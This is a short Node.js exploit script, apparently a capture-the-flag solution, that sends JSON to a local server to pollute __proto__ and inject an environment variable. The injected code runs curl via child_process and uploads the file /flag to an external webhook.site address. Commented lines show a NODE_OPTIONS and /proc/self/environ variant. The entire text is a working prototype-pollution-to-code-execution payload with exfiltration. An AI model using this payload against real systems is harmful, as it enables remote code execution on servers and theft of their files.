
// var request = require('request');
data = {
    "detail": "__proto__",
    "menu": "env",
    "name": { "EVIL":"console.log(require('child_process').execSync('curl -X POST -F upfile=@/flag https://webhook.site/f32b5cc9-656e-4cc5-a4e6-475cb256f19a').toString())//"}
    // "menu": "NODE_OPTIONS",
    // "name": "--require /proc/self/environ"
}

var request = require('request');
var options = {
	uri: "http://localhost:49160",
  headers: {
    "Content-type": "application/json",
  },
  json: data
};
request.post(options, function(error, response, body){
	console.log(body)
});
